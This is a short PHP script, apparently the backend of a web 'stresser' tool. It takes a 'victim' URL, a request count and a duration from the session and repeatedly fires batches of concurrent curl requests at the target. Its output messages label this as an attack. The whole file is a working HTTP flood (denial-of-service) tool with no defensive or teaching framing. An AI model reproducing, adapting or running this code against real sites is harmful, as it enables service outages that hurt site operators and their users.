<?php
session_start();
set_time_limit(0);


$url = $_SESSION['victim'];
$amount = $_SESSION['amount'];
$mh = curl_multi_init();
$chArray = [];
$x=0;
$second = $_SESSION["seconds"];
$startTime = microtime(true);
while (microtime(true) - $startTime < $second ) {
    echo "Attack initializing... \n";
    echo "<br>";
    //if($x == 9) break;
    for ($i = 0; $i < $amount; $i++) {
        
        echo "\n";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_multi_add_handle($mh, $ch);
        $chArray[] = $ch;
    }
    echo "Attack starts now \n";
    echo "<br>";
    $active = null;
    do {
        
        $status = curl_multi_exec($mh, $active);
        
        
    } while ($status === CURLM_CALL_MULTI_PERFORM || $active);

    echo "One loop is over. Attacking again... \n";
    echo "<br>";
}



echo 'Attack finished';
?>
